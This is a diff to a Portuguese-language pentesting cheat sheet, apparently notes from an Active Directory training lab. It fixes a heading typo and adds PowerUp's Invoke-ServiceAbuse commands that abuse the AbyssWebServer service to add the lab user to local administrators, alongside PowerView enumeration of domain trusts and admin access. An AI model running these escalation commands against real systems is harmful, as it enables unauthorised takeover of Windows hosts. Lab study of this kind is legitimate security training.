@@ -2604,9 +2604,15 @@ Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
 Find-LocalAdminAccess -Verbose
 Find-LocalAdminAccess -Domain tech.local
 ```
-##### POWERVIEW OLD - TENTAR EFETUAR A ELEVAÇÃO DE PRIVILEGIO LOCALMENte
+##### POWERVIEW OLD - TENTAR EFETUAR A ELEVAÇÃO DE PRIVILEGIO LOCALMENtE
 ```
 Import-Module .\PowerUp.ps1
 Invoke-AllChecks
 help invoke-ServiceAbuse -examples
+```
+ADICIONAR MEU USUARIO AO GUPO DE ADMINISTRADORES LOCAIS (FAZER LOGOFF E LOGON DEPOIS) (EU TENHO A SENHA DO USUARIO QP FOI A INICIAL DO ALBORATORIO)
+```
+Invoke-ServiceAbuse -Name AbyssWebServer -Username dcorp\student209
+Invoke-ServiceAbuse -Name AbyssWebServer -Username dcorp\student209 -Verbose
+net localgroup administrators
 ```
